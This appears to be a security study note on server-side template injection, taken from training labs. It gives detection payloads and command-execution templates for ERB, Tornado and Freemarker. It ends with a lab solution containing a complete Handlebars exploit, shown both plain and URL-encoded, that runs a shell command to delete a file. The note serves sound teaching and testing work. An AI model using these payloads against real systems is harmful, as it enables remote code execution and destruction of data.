
# Server-Side Template Injection (SSTI)

**Category:** Server-Side Template Injection  
**Severity:** High or Critical

---

## Definition

**Server-Side Template Injection (SSTI)** occurs when an application unsafely embeds user-controlled input into a server-side template, causing the input to be interpreted as template code rather than ordinary data.

Template engines process templates to generate dynamic content, such as HTML pages. If an attacker can inject template expressions into an unsafe template, they may be able to manipulate the rendering process and, depending on the engine and its capabilities, execute server-side code.

In simple terms:

```text
User Input
    |
    | Embedded into template
    v
Server-Side Template
    |
    | Template evaluation
    v
Injected Expression Executed
    |
    v
Unexpected Application Behavior
```

---

## Basic Server-Side Template Injection (ERB)

- **The Objective:** Identify an ERB template injection vulnerability and exploit it to execute operating system commands.

- **The Mechanism:** The application unsafely incorporates user-controlled input from the `message` parameter into an ERB template. ERB uses `<%= ... %>` to evaluate an expression and render its result. If user input is interpreted as template code, an attacker may be able to execute Ruby functionality on the server.

- **Core Layout Structure:**

```text
User-Controlled Parameter
          |
          v
      message
          |
          v
Unsafe ERB Template
          |
          | Inject expression
          v
     <%= 7*7 %>
          |
          v
Expression Evaluated
          |
          v
      Output: 49
```

- **Exploitation:** Once template evaluation is confirmed, vulnerable ERB applications may expose Ruby functionality capable of executing operating system commands, depending on the application's environment and restrictions.

- **Security Impact:** Potential server-side code execution, unauthorized file operations, and compromise of resources accessible to the application process.


## Basic ERB Template Injection

- **The Mechanism:** The application uses the `message` parameter to render content through an unsafely constructed ERB template. ERB evaluates expressions enclosed in `<%= ... %>` and renders their results.

- **Detection Payload:**

```erb
<%= 7*7 %>
```

If the response renders `49`, this indicates that the input is being evaluated as a template expression.

- **Exploitation:** ERB runs within Ruby, so an exploitable template may allow access to methods such as `system()` to execute operating system commands.

```erb
<%= system("command") %>
```

- **Core Attack Flow:**

```text
message Parameter
       |
       v
Unsafe ERB Template
       |
       v
Expression Evaluation
       |
       v
Ruby Method Execution
       |
       v
Operating System Command
```

- **Root Cause:** User-controlled input is interpreted as ERB template code instead of being handled as data.

- **Security Impact:** Potential remote code execution and unauthorized file operations under the privileges of the application process.


## SSTI in Code Context (Tornado)

- **The Mechanism:** The application inserts the `blog-post-author-display` parameter into a Tornado template expression. By closing the existing expression with `}}`, an attacker may inject additional template syntax.

- **Detection Payload:**

```python
user.name}}{{7*7}}
```

If the rendered username includes `49`, this indicates that the injected expression was evaluated by the template engine.

- **Exploitation:** Tornado supports `{% ... %}` directives for Python statements. In a vulnerable template, these may be abused to import modules and execute operating system commands.

```python
{% import os %}
{{os.system('command')}}
```

- **Core Attack Flow:**

```text
User-Controlled Parameter
          |
          v
Existing Template Expression
          |
          v
Escape with }}
          |
          v
Inject Tornado Template Syntax
          |
          v
Python Code Execution
```

- **Root Cause:** User input is inserted into template code without safely separating data from template syntax.

- **Security Impact:** Potential remote code execution and unauthorized server-side file operations.


## SSTI Using Documentation (Freemarker)

- **The Mechanism:** Freemarker uses `${...}` to evaluate expressions. An invalid expression, such as `${foobar}`, can produce an error that reveals the template engine.

- **Identification:**

```text
${foobar}
    |
    v
Template Error
    |
    v
Identify Freemarker
```

- **Exploitation:** Freemarker's `new()` built-in can instantiate classes implementing `TemplateModel`. The `freemarker.template.utility.Execute` class can execute operating system commands.

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("command")}
```

- **Root Cause:** User-controlled template content can invoke dangerous engine features without adequate restrictions.

- **Security Impact:** Potential remote code execution and unauthorized server-side operations.

Lab: Server-side template injection in an unknown language with a documented exploit

PRACTITIONER
LAB Solved

This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.
ACCESS THE LAB
Solution

    Notice that when you try to view more details about the first product, a GET request uses the message parameter to render "Unfortunately this product is out of stock" on the home page.
    Experiment by injecting a fuzz string containing template syntax from various different template languages, such as ${{<%[%'"}}%\, into the message parameter. Notice that when you submit invalid syntax, an error message is shown in the output. This identifies that the website is using Handlebars.
    Search the web for "Handlebars server-side template injection". You should find a well-known exploit posted by @Zombiehelp54.

    Modify this exploit so that it calls require("child_process").exec("rm /home/carlos/morale.txt") as follows:
    wrtz{{#with "s" as |string|}}
        {{#with "e"}}
            {{#with split as |conslist|}}
                {{this.pop}}
                {{this.push (lookup string.sub "constructor")}}
                {{this.pop}}
                {{#with string.split as |codelist|}}
                    {{this.pop}}
                    {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                    {{this.pop}}
                    {{#each conslist}}
                        {{#with (string.sub.apply 0 codelist)}}
                            {{this}}
                        {{/with}}
                    {{/each}}
                {{/with}}
            {{/with}}
        {{/with}}
    {{/with}}

    URL encode your exploit and add it as the value of the message parameter in the URL. The final exploit should look like this, but remember to replace YOUR-LAB-ID with your own lab ID:
    https://YOUR-LAB-ID.web-security-academy.net/?message=wrtz%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d
    The lab should be solved when you load the URL.

